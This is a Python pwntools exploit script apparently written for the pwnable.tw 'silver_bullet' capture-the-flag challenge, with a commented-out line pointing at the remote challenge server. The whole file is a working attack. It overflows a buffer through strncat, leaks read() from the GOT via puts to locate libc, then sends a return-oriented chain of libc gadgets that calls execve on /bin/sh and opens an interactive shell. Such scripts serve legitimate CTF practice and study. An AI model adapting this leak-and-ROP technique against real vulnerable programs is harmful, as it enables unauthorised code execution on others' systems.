from pwn import *

context.clear(terminal = ['tmux', 'splitw', '-fh'])

libc = ELF('./libc_32.so.6')

gdb1 = '''
b create_bullet
c
b *power_up+105
b *main+6
'''

# functions
main = p32(0x8048954)
puts = p32(0x80484a8)

# gadget offsets
add_eax_8 = 0xff908
add_eax_3 = 0x9f3c0
inc_ecx = 0x53170
xor_edx_edx = 0x7c875
pop_ebx = 0x18395
int_80 = 0x2c87

p = process('./silver_bullet', env={'LD_PRELOAD':'./libc_32.so.6'})
#p = gdb.debug('./silver_bullet', gdb1, env={'LD_PRELOAD':'./libc_32.so.6'})
#p = remote('chall.pwnable.tw', 10103)

p.sendlineafter(b'Your choice :', b'1')
p.sendafter(b'bullet :', b' ' * 0x13)
p.sendlineafter(b'Your choice :', b'2')
p.sendafter(b'bullet :', b'123456789685473rtegfhdmnvhgtrefdsgbvncmhjtryefdgbvcnmfghjytr')

p.recvuntil(b'Your choice :').decode()

p.sendlineafter(b'Your choice :', b'2')

# cant have any null bytes bc strncat stops at first null byte
payload  = b'\xff' * 3          # buffer len / power
payload += p32(0x0b0b0b0b)      # ebp
payload += puts                 # call puts
payload += main                 # ret address so puts() doesnt segfault
payload += p32(0x804afd0)       # GOT addr of read() so puts() leaks addr

p.sendline(payload)
p.sendlineafter(b'Your choice :', b'3')

p.recvuntil(b'!!\n').decode()

read = int.from_bytes(p.recv(4), 'little')
libc.address = read - libc.sym['read']
print(f'[+] libc base addr\t@ {hex(libc.address)}')
print(f'[+] read\t\t@ {hex(read)}')

p.recvline()

p.sendlineafter(b'Your choice :', b'1')
p.sendlineafter(b'bullet :', b' ' * 0x23)

p.recvline().decode()

p.sendlineafter(b'Your choice :', b'2')
p.sendafter(b'bullet :', b'123456789685473rtegfhdmnvhgtrefdsgbvncmhjtryefdgbvcnmfghjytr')

p.recvuntil(b'Your choice :').decode()

p.sendlineafter(b'Your choice :', b'2')
p.clean()

binsh = p32(next(libc.search(b'/bin/sh\x00')))

payload  =  b'\xff' * 3                         # buffer len / power
payload += p32(0x0b0b0b0b)                      # ebp
payload += p32(libc.address + xor_edx_edx)      # ret addr
payload += p32(libc.address + add_eax_8)
payload += p32(libc.address + add_eax_3)
payload += p32(libc.address + inc_ecx)
payload += p32(libc.address + pop_ebx)
payload += binsh
payload += p32(libc.address + int_80)

p.send(payload)
p.sendlineafter(b'Your choice :', b'3')

sleep(1.5)
p.clean()

p.interactive()
